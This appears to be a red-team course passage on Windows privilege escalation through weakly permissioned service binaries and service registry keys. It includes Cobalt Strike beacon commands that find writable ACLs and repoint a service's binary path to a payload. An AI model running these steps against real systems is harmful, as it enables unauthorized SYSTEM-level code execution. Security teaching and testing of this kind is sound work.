
Mistakes can be made in the installation process for a service which can grant weak permissions, leading to elevation of privilege vulnerabilities.

## Service File Permissions

The binary that a service runs may have a weak ACE applied that allows standard users to modify it.  The ACE may be explicitly set on the binary itself, or inherited from its parent directory.  An adversary can simply overwrite the original binary with their own, and the Service Control Manager will execute it the next time the service is started [T1574.010](https://attack.mitre.org/techniques/T1574/010/)

```powershell
beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe"
C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe NT AUTHORITY\Authenticated Users:F
```

The difficulty in exploiting this is that the service binary cannot be overwritten whilst the service is already running.  It may be possible to stop and start the service but this would also be a non-default misconfiguration.

> This is obviously quite a destructive action because you're completely overwriting the service binary with your payload.

## Service Registry Permissions

When a new service is installed, an entry is written into the registry at `HKLM\SYSTEM\CurrentControlSet\Services`.  These keys hold the configuration for the service, such as the name, description, binary path, and start-up user.  If a weak ACE is granted on the service's registry key during installation, an adversary may be able to modify the service's configuration to execute their malicious payload [T1574.011](https://attack.mitre.org/techniques/T1574/011/)

```powershell
beacon> powerpick Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService | fl

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BadWindowsService
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\Authenticated Users Allow  FullControl
         BUILTIN\Users Allow  ReadKey
         BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         CREATOR OWNER Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         ReadKey
Audit  : 
Sddl   : O:BAG:SYD:AI(A;OICI;KA;;;AU)(A;CIID;KR;;;BU)(A;CIID;KA;;;BA)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AC)
         (A;CIID;KR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934
         681)
```

A common way to do this is to simply change the binary path so that the service points to a completely different binary.

```powershell
beacon> sc_stop BadWindowsService
beacon> sc_config BadWindowsService C:\Path\to\Payload.exe 0 2
beacon> sc_start BadWindowsService
```

> A more left-field approach is to leverage a lesser-known registry key, such as _Performance_.  Discovered by [Clément Labro](https://itm4n.github.io/windows-registry-rpceptmapper-eop/), this key points to a DLL responsible for monitoring the performance of a service.  Since it's optional and more suitable for dev/test than prod, this is often not found in most service installations by default.  This means it can be added by an adversary without interfering with the service's normal operation.